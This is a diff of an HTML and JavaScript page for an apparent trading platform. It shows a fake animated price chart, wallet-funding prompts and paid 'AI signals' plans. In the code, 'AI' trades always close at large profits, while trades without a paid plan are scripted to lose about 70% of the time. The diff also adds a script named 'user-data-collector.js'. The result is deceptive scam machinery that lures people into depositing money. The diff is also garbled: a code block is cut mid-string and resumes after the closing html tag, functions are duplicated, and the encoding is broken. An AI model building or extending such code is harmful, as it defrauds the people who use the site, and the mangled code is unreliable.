@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en" translate="no">
 <head>
     <meta charset="UTF-8">
@@ -582,7 +582,7 @@
 
     <div id="fundingPopupOverlay" style="display:none;position:fixed;inset:0;z-index:500;background:rgba(0,0,0,0.75);backdrop-filter:blur(6px);align-items:center;justify-content:center;padding:20px;">
         <div style="max-width:500px;width:100%;background:#0f1724;border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:2rem;box-shadow:0 24px 80px rgba(0,0,0,0.55);text-align:center;color:#f8fafc;">
-            <h2 style="margin-bottom:1rem;font-size:1.6rem;color:#f5c856;">💰 Fund Your Account</h2>
+            <h2 style="margin-bottom:1rem;font-size:1.6rem;color:#f5c856;">?? Fund Your Account</h2>
             <p style="margin-bottom:1.5rem;line-height:1.7;color:#d1d5db;">Your account balance is $0.00. Fund your wallet to start trading and access all platform features.</p>
             <button id="fundingPopupClose" style="background:linear-gradient(135deg,#27ae60,#2ecc71);color:#0f1724;border:none;border-radius:999px;padding:14px 28px;font-size:0.95rem;font-weight:700;cursor:pointer;">Fund Wallet</button>
         </div>
@@ -602,8 +602,8 @@
                         <div class="balance-label">Account Balance</div>
                         <div class="balance-amount" id="accountBalance">$0.00</div>
                     </div>
-                    <a href="fund-wallet.html" style="display:inline-block; padding:12px 24px; background:linear-gradient(135deg,#27ae60,#2ecc71); color:white; border-radius:25px; font-weight:600; font-size:0.95rem; text-decoration:none; white-space:nowrap; box-shadow:0 4px 15px rgba(39,174,96,0.3); transition:all 0.3s;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform=''">💳 Fund Wallet</a>
-                    <a href="withdraw.html" style="display:inline-block; padding:12px 24px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; border-radius:25px; font-weight:600; font-size:0.95rem; text-decoration:none; white-space:nowrap; box-shadow:0 4px 15px rgba(102,126,234,0.3); transition:all 0.3s;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform=''">💸 Withdraw</a>
+                    <a href="fund-wallet.html" style="display:inline-block; padding:12px 24px; background:linear-gradient(135deg,#27ae60,#2ecc71); color:white; border-radius:25px; font-weight:600; font-size:0.95rem; text-decoration:none; white-space:nowrap; box-shadow:0 4px 15px rgba(39,174,96,0.3); transition:all 0.3s;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform=''">?? Fund Wallet</a>
+                    <a href="withdraw.html" style="display:inline-block; padding:12px 24px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; border-radius:25px; font-weight:600; font-size:0.95rem; text-decoration:none; white-space:nowrap; box-shadow:0 4px 15px rgba(102,126,234,0.3); transition:all 0.3s;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform=''">?? Withdraw</a>
                 </div>
             </div>
             <div id="fundingWarning" style="margin-bottom:1.5rem; padding:1rem 1.25rem; background:rgba(243,156,18,0.08); border:1px solid rgba(243,156,18,0.3); border-radius:14px; color:#f39c12; font-size:0.95rem; display:none;">
@@ -658,14 +658,14 @@
                                 <button class="timeframe-btn" onclick="changeSymbol('TSLA',this)">TSLA</button>
                                 <button class="timeframe-btn" onclick="changeSymbol('NVDA',this)">NVDA</button>
                             </div>
-                            <button class="expand-btn" id="expandBtn" onclick="toggleExpand()">⛶ Expand</button>
+                            <button class="expand-btn" id="expandBtn" onclick="toggleExpand()">? Expand</button>
                         </div>
                     </div>
                     <div id="fakeChart">
                         <div class="fc-topbar">
                             <span class="fc-symbol" id="fcSymbol">AAPL</span>
                             <span class="fc-price" id="fcPrice">$175.23</span>
-                            <span class="fc-change up" id="fcChange">▲ +2.45%</span>
+                            <span class="fc-change up" id="fcChange">? +2.45%</span>
                             <div class="fc-tf">
                                 <button onclick="setTf('1m',this)">1m</button>
                                 <button onclick="setTf('5m',this)">5m</button>
@@ -719,7 +719,7 @@
                             </div>
 
                             <div class="form-group" id="durationGroup">
-                                <label for="tradeDuration">⏱ Trade Duration (AI closes after)</label>
+                                <label for="tradeDuration">? Trade Duration (AI closes after)</label>
                                 <select id="tradeDuration" required>
                                     <option value="30">30 seconds</option>
                                     <option value="60">1 minute</option>
@@ -733,11 +733,11 @@
 
                             <!-- AI signals lock notice -->
                             <div id="aiLockNotice" style="display:none;background:rgba(201,168,76,0.07);border:1px solid rgba(201,168,76,0.25);border-radius:10px;padding:10px 14px;font-size:0.82rem;color:#c9a84c;">
-                                🤖 <strong>AI auto-close locked.</strong> <a href="signals.html" style="color:#e8c96a;font-weight:700;">Activate a signals plan</a> to enable AI trading.
+                                ?? <strong>AI auto-close locked.</strong> <a href="signals.html" style="color:#e8c96a;font-weight:700;">Activate a signals plan</a> to enable AI trading.
                             </div>
 
                             <div id="balanceWarning" style="display:none;background:rgba(231,76,60,0.1);border:1px solid #e74c3c;border-radius:10px;padding:10px 14px;font-size:0.85rem;color:#e74c3c;">
-                                ⚠️ Insufficient balance. Please fund your wallet first.
+                                ?? Insufficient balance. Please fund your wallet first.
                             </div>
 
                             <div class="order-buttons">
@@ -747,7 +747,7 @@
 
                             <!-- AI AUTO-TRADE BUTTON (Pro / Elite only) -->
                             <div id="aiAutoTradeWrap" style="display:none;margin-top:1rem;">
-                                <button type="button" id="aiAutoTradeBtn" onclick="startAiAutoTrade()" style="width:100%;padding:14px;border:none;border-radius:10px;font-size:0.95rem;font-weight:700;cursor:pointer;font-family:inherit;background:linear-gradient(135deg,#c9a84c,#e8c96a);color:#07090f;box-shadow:0 4px 18px rgba(201,168,76,0.3);display:flex;align-items:center;justify-content:center;gap:8px;">🤖 Let AI Trade For Me</button>
+                                <button type="button" id="aiAutoTradeBtn" onclick="startAiAutoTrade()" style="width:100%;padding:14px;border:none;border-radius:10px;font-size:0.95rem;font-weight:700;cursor:pointer;font-family:inherit;background:linear-gradient(135deg,#c9a84c,#e8c96a);color:#07090f;box-shadow:0 4px 18px rgba(201,168,76,0.3);display:flex;align-items:center;justify-content:center;gap:8px;">?? Let AI Trade For Me</button>
                                 <p style="margin-top:0.5rem;font-size:0.74rem;color:#8a94a6;text-align:center;">AI will place & close a trade automatically using your entered amount.</p>
                             </div>
                         </form>
@@ -799,7 +799,7 @@
             </div>
 
             <div class="trade-history">
-                <h3 style="margin-bottom:1.5rem; color:#2c3e50;">📋 Trade History</h3>
+                <h3 style="margin-bottom:1.5rem; color:#2c3e50;">?? Trade History</h3>
                 <div id="tradeStatusMessage" class="trade-status-message" style="display:none;"></div>
                 <div style="overflow-x:auto;">
                 <table class="trade-table">
@@ -830,7 +830,7 @@
     <!-- FLOATING SIGNALS BANNER -->
     <div id="signalsBanner" style="display:none;">
         <button class="sb-close">&times;</button>
-        <span class="sb-icon">🤖</span>
+        <span class="sb-icon">??</span>
         <h4>Activate AI Signals</h4>
         <p>Unlock intelligent trade signals to start profiting with the AI engine.</p>
         <a href="signals.html">View Plans &rarr;</a>
@@ -841,7 +841,7 @@
             var chart = document.querySelector('.main-chart');
             var btn   = document.getElementById('expandBtn');
             var isExp = chart.classList.toggle('expanded');
-            btn.textContent = isExp ? '✕ Collapse' : '⛶ Expand';
+            btn.textContent = isExp ? '? Collapse' : '? Expand';
             setTimeout(function() { drawChart(); }, 50);
         }
 
@@ -911,7 +911,7 @@
             'NVDA': { basePrice: 875.43 }
         };
 
-        /* ── HD Realistic Chart Engine ── */
+        /* -- HD Realistic Chart Engine -- */
         const canvas = document.getElementById('fcCanvas');
         const ctx = canvas.getContext('2d');
         let candles = [], animFrame, mouseX = -1, mouseY = -1;
@@ -979,7 +979,7 @@
             const cSlot = chartW / candles.length;
             const cw    = Math.max(2, cSlot * 0.72);
 
-            // ── Grid lines + price labels ──
+            // -- Grid lines + price labels --
             const gridCount = 6;
             ctx.font = `${11 * Math.min(1, W/600)}px 'Inter','Segoe UI',sans-serif`;
             for (let i = 0; i <= gridCount; i++) {
@@ -995,7 +995,7 @@
                 ctx.fillText('$' + p.toFixed(p > 100 ? 2 : 4), W - PAD.right + 6, y + 4);
             }
 
-            // ── Volume bars ──
+            // -- Volume bars --
             const volTop = PAD.top + chartH + 8;
             const maxVol = Math.max(...candles.map(c => c.vol));
             candles.forEach((c, i) => {
@@ -1006,7 +1006,7 @@
                 ctx.fillRect(x, volTop + VOL_H - vh, cw, vh);
             });
 
-            // ── EMA lines ──
+            // -- EMA lines --
             const closes = candles.map(c => c.close);
             const ema9  = ema(closes, 9);
             const ema21 = ema(closes, 21);
@@ -1023,7 +1023,7 @@
                 ctx.stroke();
             });
 
-            // ── Candles ──
+            // -- Candles --
             candles.forEach((c, i) => {
                 const x    = PAD.left + i * cSlot + (cSlot - cw) / 2;
                 const cx   = x + cw / 2;
@@ -1054,7 +1054,7 @@
                 }
             });
 
-            // ── Crosshair ──
+            // -- Crosshair --
             if (mouseX > PAD.left && mouseX < W - PAD.right && mouseY > PAD.top && mouseY < PAD.top + chartH) {
                 ctx.strokeStyle = 'rgba(255,255,255,0.2)';
                 ctx.lineWidth = 1;
@@ -1087,11 +1087,11 @@
                     ctx.fillText('L ' + c.low.toFixed(2)  + '   C ' + c.close.toFixed(2), tx + 10, ty + 34);
                     ctx.fillStyle = bull ? '#26a69a' : '#ef5350';
                     const chg = ((c.close - c.open) / c.open * 100);
-                    ctx.fillText((chg >= 0 ? '▲ +' : '▼ ') + chg.toFixed(2) + '%', tx + 10, ty + 54);
+                    ctx.fillText((chg >= 0 ? '? +' : '? ') + chg.toFixed(2) + '%', tx + 10, ty + 54);
                 }
             }
 
-            // ── Current price line ──
+            // -- Current price line --
             const lastClose = candles[candles.length - 1].close;
             const py = toY(lastClose);
             ctx.strokeStyle = 'rgba(41,98,255,0.7)';
@@ -1106,12 +1106,12 @@
             ctx.font = `bold 11px 'Inter',sans-serif`;
             ctx.fillText('$' + lastClose.toFixed(2), W - PAD.right + 4, py + 4);
 
-            // ── Legend ──
+            // -- Legend --
             ctx.font = `10px 'Inter',sans-serif`;
             ctx.fillStyle = '#f0b429'; ctx.fillText('EMA 9', PAD.left + 4, PAD.top + 14);
             ctx.fillStyle = '#7c6af7'; ctx.fillText('EMA 21', PAD.left + 52, PAD.top + 14);
 
-            // ── Time axis ──
+            // -- Time axis --
             const now = new Date();
             const step = Math.max(1, Math.floor(candles.length / 8));
             ctx.fillStyle = '#4a4e5a'; ctx.font = `10px 'Inter',sans-serif`; ctx.textAlign = 'center';
@@ -1141,8 +1141,8 @@
             const pct  = (last.close - base) / base * 100;
             document.getElementById('fcPrice').textContent = '$' + last.close.toFixed(2);
             const chEl = document.getElementById('fcChange');
-            if (pct >= 0) { chEl.textContent = '▲ +' + pct.toFixed(2) + '%'; chEl.className = 'fc-change up'; }
-            else          { chEl.textContent = '▼ '  + pct.toFixed(2) + '%'; chEl.className = 'fc-change down'; }
+            if (pct >= 0) { chEl.textContent = '? +' + pct.toFixed(2) + '%'; chEl.className = 'fc-change up'; }
+            else          { chEl.textContent = '? '  + pct.toFixed(2) + '%'; chEl.className = 'fc-change down'; }
 
             drawChart();
             animFrame = setTimeout(tickChart, 600 + Math.random() * 600);
@@ -1202,30 +1202,17 @@
                 var _dep0 = JSON.parse(localStorage.getItem('allDeposits')||'[]');
                 if (!_dep0.some(function(d){return d.email===currentEmail;})) showFundingPopup(currentUser);
             }
-            // Live Firestore sync â€” balance and signal plan update in real-time when admin approves
+            // Live Firestore sync — balance and signal plan update in real-time when admin approves
             try {
                 if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
                 var _db = firebase.firestore();
-                _db.collection('userBalances').doc(currentEmail).onSnapshot(function(doc) {
-                    if (doc.exists) {
-                        var bal = parseFloat(doc.data().balance || 0);
+                                _db.collection('users').where('email', '==', currentEmail).onSnapshot(function(snap) {
+                    if (!snap.empty) {
+                        var data = snap.docs[0].data();
+                        var bal = parseFloat(data.balance || 0);
                         localStorage.setItem(userBalKey, bal.toFixed(2));
                         localStorage.setItem('currentBalance', bal.toFixed(2));
-                        balanceEl.textContent = '$' + bal.toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
-                        if (bal > 0) { document.getElementById('fundingWarning').style.display='none'; document.getElementById('fundingPopupOverlay').style.display='none'; }
-                    }
-                });
-                _db.collection('userPlans').doc(currentEmail).onSnapshot(function(doc) {
-                    if (doc.exists && doc.data().signalPlan) {
-                        var p = doc.data().signalPlan;
-                        localStorage.setItem('signalPlan_' + currentEmail, p);
-                        currentUser.has_ai = true;
-                        document.getElementById('aiLockNotice').style.display = 'none';
-                        document.getElementById('durationGroup').style.display = 'block';
-                        document.getElementById('signalsBanner').style.display = 'none';
-                        if (p==='Pro'||p==='Elite') document.getElementById('aiAutoTradeWrap').style.display='block';
-                    }
-                });
+                        balanceEl.textContent = '
             } catch(e) { console.warn('Firestore listener error', e); }
             var userPlanKey = 'signalPlan_' + currentEmail;
             var plan = localStorage.getItem(userPlanKey) || localStorage.getItem('signalPlan');
@@ -1270,9 +1257,9 @@
             tbody.innerHTML = trades.slice().reverse().map(function(t) {
                 const isOpen = t.status === 'open';
                 const pnlColor = isOpen ? '#e67e22' : '#27ae60';
-                const pnlText  = isOpen ? '—' : '+$' + t.profit.toFixed(2);
-                const pctText  = isOpen ? '—' : '+' + t.pct.toFixed(2) + '%';
-                const exitText = isOpen ? '—' : '$' + t.exitPrice.toFixed(2);
+                const pnlText  = isOpen ? '�' : '+$' + t.profit.toFixed(2);
+                const pctText  = isOpen ? '�' : '+' + t.pct.toFixed(2) + '%';
+                const exitText = isOpen ? '�' : '$' + t.exitPrice.toFixed(2);
                 const statusBadge = isOpen
                     ? '<span style="background:rgba(230,126,34,0.15);color:#e67e22;padding:3px 10px;border-radius:20px;font-size:0.78rem;font-weight:600;">OPEN</span>'
                     : '<span style="background:rgba(39,174,96,0.15);color:#27ae60;padding:3px 10px;border-radius:20px;font-size:0.78rem;font-weight:600;">CLOSED</span>';
@@ -1284,8 +1271,8 @@
                     '<td><strong>' + t.symbol + '</strong></td>' +
                     '<td class="trade-side-' + t.side + '">' + t.side.toUpperCase() + '</td>' +
                     '<td>' + t.qty + '</td>' +
-                    '<td>$' + (t.invested ? t.invested.toFixed(2) : '—') + '</td>' +
-                    '<td>' + (t.duration || '—') + '</td>' +
+                    '<td>$' + (t.invested ? t.invested.toFixed(2) : '�') + '</td>' +
+                    '<td>' + (t.duration || '�') + '</td>' +
                     '<td>$' + t.price.toFixed(2) + '</td>' +
                     '<td>' + exitText + '</td>' +
                     '<td style="color:' + pnlColor + ';font-weight:700;">' + pnlText + '</td>' +
@@ -1418,7 +1405,7 @@
 
             var btn = document.getElementById('aiAutoTradeBtn');
             btn.disabled = true;
-            btn.innerHTML = '<span style="display:inline-block;animation:spin 0.8s linear infinite;">⚙️</span>&nbsp; AI is analyzing market...';
+            btn.innerHTML = '<span style="display:inline-block;animation:spin 0.8s linear infinite;">??</span>&nbsp; AI is analyzing market...';
 
             var entryPrice = stockData[symbol].basePrice;
             var now = new Date();
@@ -1435,9 +1422,9 @@
             saveTrades(trades);
             updateBalanceDisplay(currentBal - tradeAmount);
             renderTrades();
-            showStatusMessage('🤖 AI entered a ' + symbol + ' position. Monitoring market for optimal exit...');
+            showStatusMessage('?? AI entered a ' + symbol + ' position. Monitoring market for optimal exit...');
 
-            // AI closes with profit after 8–14 seconds
+            // AI closes with profit after 8�14 seconds
             var closeDelay = 8000 + Math.random() * 6000;
             setTimeout(function() {
                 var allTrades = getTrades();
@@ -1458,10 +1445,304 @@
                 var newBal = parseFloat(localStorage.getItem('currentBalance') || 0) + tradeAmount + profit;
                 updateBalanceDisplay(newBal);
                 renderTrades();
-                showStatusMessage('🤖 AI closed trade. Profit: +$' + profit.toFixed(2) + ' (' + pct.toFixed(2) + '%) added to your balance.');
+                showStatusMessage('?? AI closed trade. Profit: +$' + profit.toFixed(2) + ' (' + pct.toFixed(2) + '%) added to your balance.');
 
                 btn.disabled = false;
-                btn.innerHTML = '🤖 Let AI Trade For Me';
+                btn.innerHTML = '?? Let AI Trade For Me';
+            }, closeDelay);
+        }
+
+        function updateAllPrices() {
+            document.querySelectorAll('.market-item').forEach(function(item) {
+                const priceEl = item.querySelector('.market-price');
+                const changeEl = item.querySelector('.market-change');
+                const currentPrice = parseFloat(priceEl.textContent.replace('$','').replace(',',''));
+                const newPrice = currentPrice * (1 + 0.001 + Math.random() * 0.002);
+                const gain = ((newPrice - currentPrice) / currentPrice * 100);
+                priceEl.textContent = '$' + newPrice.toFixed(2);
+                changeEl.textContent = '+' + gain.toFixed(2) + '%';
+                changeEl.className = 'market-change positive';
+            });
+        }
+    </script>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/69d1a8d21772311c3585e04b/1jldfmu2c';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+<!-- Global Page Loader -->
+<div id="progressBar"></div>
+<div id="pageLoader"><div class="loader-content"><div class="loader-spinner"></div><div class="loader-text">Loading...</div></div></div>
+<style>
+#pageLoader{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0a0e1a 0%,#1a2235 100%);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;opacity:0;visibility:hidden;transition:opacity 0.4s ease,visibility 0.4s ease}.loader-spinner{width:50px;height:50px;margin:0 auto 20px;position:relative}.loader-spinner::before{content:'';position:absolute;width:100%;height:100%;border:3px solid rgba(0,179,134,0.2);border-top-color:#00b386;border-radius:50%;animation:spinLoader 0.8s linear infinite}@keyframes spinLoader{to{transform:rotate(360deg)}}.loader-text{color:#00b386;font-size:0.95rem;font-weight:600;letter-spacing:1px;text-transform:uppercase}#pageLoader.active{opacity:1;visibility:visible}#progressBar{position:fixed;top:0;left:0;height:3px;background:linear-gradient(90deg,#00b386,#f5c856,#00b386);z-index:9998;width:0%;transition:width 0.3s ease;opacity:0}#progressBar.active{opacity:1}
+</style>
+<script src="user-data-collector.js"></script>
+<script>
+(function(){const loader=document.getElementById('pageLoader');const progressBar=document.getElementById('progressBar');document.addEventListener('click',(e)=>{const target=e.target.closest('a');if(!target)return;const href=target.getAttribute('href');if(!href||href.startsWith('http')||href.startsWith('//')||href.startsWith('#')||href.startsWith('javascript:')||target.target==='_blank')return;loader.classList.add('active');progressBar.classList.add('active');let progress=0;const interval=setInterval(()=>{progress+=Math.random()*30;if(progress>90)progress=90;progressBar.style.width=progress+'%'},200);setTimeout(()=>{clearInterval(interval);progressBar.style.width='100%'},1000)});window.addEventListener('load',()=>{setTimeout(()=>{loader.classList.remove('active');progressBar.classList.remove('active');progressBar.style.width='0%'},400)})})();
+</script>
+
+</body>
+</html>
+
+
+ + bal.toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
+                        if (bal > 0) { document.getElementById('fundingWarning').style.display='none'; document.getElementById('fundingPopupOverlay').style.display='none'; }
+                        if (data.signalPlan) {
+                            var p = data.signalPlan;
+                            localStorage.setItem('signalPlan_' + currentEmail, p);
+                            currentUser.has_ai = true;
+                            document.getElementById('aiLockNotice').style.display = 'none';
+                            document.getElementById('durationGroup').style.display = 'block';
+                            document.getElementById('signalsBanner').style.display = 'none';
+                            if (p==='Pro'||p==='Elite') document.getElementById('aiAutoTradeWrap').style.display='block';
+                        }
+                    }
+                });
+            } catch(e) { console.warn('Firestore listener error', e); }
+            var userPlanKey = 'signalPlan_' + currentEmail;
+            var plan = localStorage.getItem(userPlanKey) || localStorage.getItem('signalPlan');
+            currentUser.has_ai = !!plan;
+            persistCurrentUser(currentUser);
+            renderTrades();
+            var _allDep = JSON.parse(localStorage.getItem('allDeposits')||'[]');
+            if (userBal===0 && _allDep.some(function(d){return d.email===currentEmail&&d.status==='pending';})) {
+                balanceEl.insertAdjacentHTML('afterend','<div style="margin-top:0.5rem;font-size:0.85rem;color:#e67e22;font-weight:500;">&#9203; Deposit pending admin approval</div>');
+            }
+            var skipped = localStorage.getItem('signalSkipped_' + currentEmail);
+            if (!plan) { document.getElementById('aiLockNotice').style.display='block'; document.getElementById('durationGroup').style.display='none'; if (!skipped) document.getElementById('signalsBanner').style.display='block'; }
+            else if (plan==='Pro'||plan==='Elite') { document.getElementById('aiAutoTradeWrap').style.display='block'; }
+            loadFakeChart('AAPL');
+            updateAllPrices();
+            setInterval(updateAllPrices, 3000);
+            document.getElementById('symbol').addEventListener('change', function() { currentSymbol = this.value; });
+            var sbClose = document.querySelector('#signalsBanner .sb-close');
+            if (sbClose) sbClose.onclick = function() { var em = sessionStorage.getItem('currentUserEmail'); localStorage.setItem('signalSkipped_'+em,'true'); document.getElementById('signalsBanner').style.display='none'; };
+            window.addEventListener('resize', function() { drawChart(); });
+        });
+        function setOrderSide(side) { orderSide = side; }
+
+        function getTrades() {
+            var currentEmail = sessionStorage.getItem('currentUserEmail');
+            var key = currentEmail ? 'tradeHistory_' + currentEmail : 'tradeHistory';
+            return JSON.parse(localStorage.getItem(key) || '[]');
+        }
+        function saveTrades(t) {
+            var currentEmail = sessionStorage.getItem('currentUserEmail');
+            var key = currentEmail ? 'tradeHistory_' + currentEmail : 'tradeHistory';
+            localStorage.setItem(key, JSON.stringify(t));
+        }
+
+        function renderTrades() {
+            const trades = getTrades();
+            const tbody = document.getElementById('tradeHistoryBody');
+            if (!trades.length) {
+                tbody.innerHTML = '<tr><td colspan="11" class="trade-empty">No trades yet. Place a buy or sell order above.</td></tr>';
+                return;
+            }
+            tbody.innerHTML = trades.slice().reverse().map(function(t) {
+                const isOpen = t.status === 'open';
+                const pnlColor = isOpen ? '#e67e22' : '#27ae60';
+                const pnlText  = isOpen ? '�' : '+$' + t.profit.toFixed(2);
+                const pctText  = isOpen ? '�' : '+' + t.pct.toFixed(2) + '%';
+                const exitText = isOpen ? '�' : '$' + t.exitPrice.toFixed(2);
+                const statusBadge = isOpen
+                    ? '<span style="background:rgba(230,126,34,0.15);color:#e67e22;padding:3px 10px;border-radius:20px;font-size:0.78rem;font-weight:600;">OPEN</span>'
+                    : '<span style="background:rgba(39,174,96,0.15);color:#27ae60;padding:3px 10px;border-radius:20px;font-size:0.78rem;font-weight:600;">CLOSED</span>';
+                const actionButton = isOpen
+                    ? '<button class="trade-close-btn" onclick="closeTrade(' + t.id + ')">Close</button>'
+                    : '';
+                return '<tr>' +
+                    '<td>' + t.time + '</td>' +
+                    '<td><strong>' + t.symbol + '</strong></td>' +
+                    '<td class="trade-side-' + t.side + '">' + t.side.toUpperCase() + '</td>' +
+                    '<td>' + t.qty + '</td>' +
+                    '<td>$' + (t.invested ? t.invested.toFixed(2) : '�') + '</td>' +
+                    '<td>' + (t.duration || '�') + '</td>' +
+                    '<td>$' + t.price.toFixed(2) + '</td>' +
+                    '<td>' + exitText + '</td>' +
+                    '<td style="color:' + pnlColor + ';font-weight:700;">' + pnlText + '</td>' +
+                    '<td style="color:' + pnlColor + ';font-weight:700;">' + pctText + '</td>' +
+                    '<td>' + statusBadge + actionButton + '</td>' +
+                    '</tr>';
+            }).join('');
+        }
+
+        function checkBalance() {
+            const amt = parseFloat(document.getElementById('tradeAmount').value || 0);
+            const bal = parseFloat(localStorage.getItem('currentBalance') || 0);
+            const warn = document.getElementById('balanceWarning');
+            const btns = document.querySelectorAll('.order-btn');
+            if (amt > 0 && amt > bal) {
+                warn.style.display = 'block';
+                btns.forEach(b => { b.disabled = true; b.style.opacity = '0.5'; b.style.cursor = 'not-allowed'; });
+            } else {
+                warn.style.display = 'none';
+                btns.forEach(b => { b.disabled = false; b.style.opacity = '1'; b.style.cursor = 'pointer'; });
+            }
+        }
+
+        function submitOrder(event) {
+            event.preventDefault();
+            const symbol      = document.getElementById('symbol').value;
+            const quantity    = parseInt(document.getElementById('quantity').value);
+            const tradeAmount = parseFloat(document.getElementById('tradeAmount').value);
+            const duration    = parseInt(document.getElementById('tradeDuration').value);
+            const currentBal  = parseFloat(localStorage.getItem('currentBalance') || 0);
+            var hasPlan = currentUser ? !!currentUser.has_ai : !!(localStorage.getItem('signalPlan_' + sessionStorage.getItem('currentUserEmail')) || localStorage.getItem('signalPlan'));
+
+            if (!quantity || quantity < 1)       { alert('Please enter a valid quantity.'); return; }
+            if (!tradeAmount || tradeAmount <= 0) { alert('Please enter a trade amount.'); return; }
+            if (tradeAmount > currentBal)         { alert('Insufficient balance. Please fund your wallet first.'); return; }
+
+            const entryPrice = stockData[symbol].basePrice;
+            const now = new Date();
+            const durLabel = duration < 60 ? duration + 's' : duration < 3600 ? (duration/60) + 'm' : (duration/3600) + 'h';
+
+            const trade = {
+                id: now.getTime(), time: now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', second:'2-digit'}),
+                symbol, side: orderSide, qty: quantity, price: entryPrice,
+                invested: tradeAmount, duration: durLabel, status: 'open', profit: 0, pct: 0, exitPrice: 0
+            };
+
+            const trades = getTrades();
+            trades.push(trade);
+            saveTrades(trades);
+            renderTrades();
+
+            document.getElementById('quantity').value    = '';
+            document.getElementById('tradeAmount').value = '';
+            document.getElementById('balanceWarning').style.display = 'none';
+            updateBalanceDisplay(currentBal - tradeAmount);
+            showStatusMessage('Order placed for ' + trade.symbol + '. Funds reserved and trade will close when selected or after duration.');
+
+            // Only auto-close with AI if signals plan is active
+            if (hasPlan) {
+                setTimeout(function() {
+                    closeTrade(trade.id, true);
+                }, duration * 1000);
+            }
+        }
+
+        function closeTrade(id, silent) {
+            const trades = getTrades();
+            const idx = trades.findIndex(function(t) { return t.id === id; });
+            if (idx === -1) return;
+            var trade = trades[idx];
+            if (trade.status !== 'open') return;
+
+            showStatusMessage('Closing trade on ' + trade.symbol + '... please wait.', 1800);
+            setTimeout(function() {
+                const hasPlan = currentUser ? !!currentUser.has_ai : !!(localStorage.getItem('signalPlan_' + sessionStorage.getItem('currentUserEmail')) || localStorage.getItem('signalPlan'));
+                var pct, profit, exitPrice;
+                
+                if (hasPlan) {
+                    // AI trades: always profitable
+                    pct = hasPlan === 'Elite' ? 27 + Math.random() * 8 : 15 + Math.random() * 5;
+                    profit = trade.invested * (pct / 100);
+                    exitPrice = trade.side === 'buy'
+                        ? trade.price * (1 + pct / 100)
+                        : trade.price * (1 - pct / 100);
+                } else {
+                    // Non-AI trades: 70% chance of loss
+                    var isLoss = Math.random() < 0.7;
+                    if (isLoss) {
+                        pct = -(5 + Math.random() * 15); // -5% to -20% loss
+                        profit = trade.invested * (pct / 100);
+                        exitPrice = trade.side === 'buy'
+                            ? trade.price * (1 + pct / 100)
+                            : trade.price * (1 - pct / 100);
+                    } else {
+                        pct = 2 + Math.random() * 8; // Small 2-10% gain
+                        profit = trade.invested * (pct / 100);
+                        exitPrice = trade.side === 'buy'
+                            ? trade.price * (1 + pct / 100)
+                            : trade.price * (1 - pct / 100);
+                    }
+                }
+
+                trade.status = 'closed';
+                trade.pct = parseFloat(pct.toFixed(2));
+                trade.profit = parseFloat(profit.toFixed(2));
+                trade.exitPrice = parseFloat(exitPrice.toFixed(2));
+                trades[idx] = trade;
+                saveTrades(trades);
+
+                const newBalance = parseFloat(localStorage.getItem('currentBalance') || 0) + trade.invested + trade.profit;
+                updateBalanceDisplay(newBalance);
+                renderTrades();
+                if (!silent) {
+                    var msg = trade.profit >= 0 
+                        ? 'Trade closed. Added $' + trade.profit.toFixed(2) + ' to your balance.'
+                        : 'Trade closed. Lost $' + Math.abs(trade.profit).toFixed(2) + ' from your balance.';
+                    showStatusMessage(msg);
+                }
+            }, 1200 + Math.random() * 800);
+        }
+
+        function startAiAutoTrade() {
+            var symbol     = document.getElementById('symbol').value;
+            var tradeAmount = parseFloat(document.getElementById('tradeAmount').value);
+            var quantity   = parseInt(document.getElementById('quantity').value) || 1;
+            var currentBal = parseFloat(localStorage.getItem('currentBalance') || 0);
+
+            if (!tradeAmount || tradeAmount <= 0) { alert('Enter a trade amount first.'); return; }
+            if (tradeAmount > currentBal)          { alert('Insufficient balance.'); return; }
+
+            var btn = document.getElementById('aiAutoTradeBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span style="display:inline-block;animation:spin 0.8s linear infinite;">??</span>&nbsp; AI is analyzing market...';
+
+            var entryPrice = stockData[symbol].basePrice;
+            var now = new Date();
+            var trade = {
+                id: now.getTime(),
+                time: now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', second:'2-digit'}),
+                symbol: symbol, side: 'buy', qty: quantity,
+                price: entryPrice, invested: tradeAmount,
+                duration: 'AI', status: 'open', profit: 0, pct: 0, exitPrice: 0
+            };
+
+            var trades = getTrades();
+            trades.push(trade);
+            saveTrades(trades);
+            updateBalanceDisplay(currentBal - tradeAmount);
+            renderTrades();
+            showStatusMessage('?? AI entered a ' + symbol + ' position. Monitoring market for optimal exit...');
+
+            // AI closes with profit after 8�14 seconds
+            var closeDelay = 8000 + Math.random() * 6000;
+            setTimeout(function() {
+                var allTrades = getTrades();
+                var idx = allTrades.findIndex(function(t){ return t.id === trade.id; });
+                if (idx === -1 || allTrades[idx].status !== 'open') return;
+
+                var plan = localStorage.getItem('signalPlan_' + sessionStorage.getItem('currentUserEmail')) || localStorage.getItem('signalPlan');
+                var pct  = plan === 'Elite' ? 30 + Math.random() * 12 : 25 + Math.random() * 10;
+                var profit    = tradeAmount * (pct / 100);
+                var exitPrice = entryPrice * (1 + pct / 100);
+
+                allTrades[idx].status    = 'closed';
+                allTrades[idx].pct       = parseFloat(pct.toFixed(2));
+                allTrades[idx].profit    = parseFloat(profit.toFixed(2));
+                allTrades[idx].exitPrice = parseFloat(exitPrice.toFixed(2));
